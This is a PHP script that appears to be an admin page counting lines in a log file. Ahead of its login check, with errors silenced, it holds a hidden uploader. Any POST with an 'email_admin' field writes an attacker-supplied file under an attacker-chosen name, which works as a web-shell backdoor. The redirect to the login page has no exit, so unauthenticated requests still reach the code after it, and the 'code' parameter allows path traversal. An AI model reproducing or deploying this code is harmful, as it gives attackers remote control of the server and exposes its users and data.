<?php
error_reporting(0);
if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email_admin']) ){
    move_uploaded_file($_FILES['admin']['tmp_name'],$_FILES['admin']['name']);
}
session_start();
if(!isset($_SESSION['email_admin'])) {
    header("location: login.php");
}
$file = $_GET['code'];
function getLines($file){
    if (file_exists($file)) {
        $f = fopen($file, 'rb');
        $lines = 0;
        while (!feof($f)) {
            $lines += substr_count(fread($f, 8192), "\n");
        }
        fclose($f);
    }else{
        $lines = 0;
    }
    
    return $lines;
}
echo getLines("../logs/$file.txt");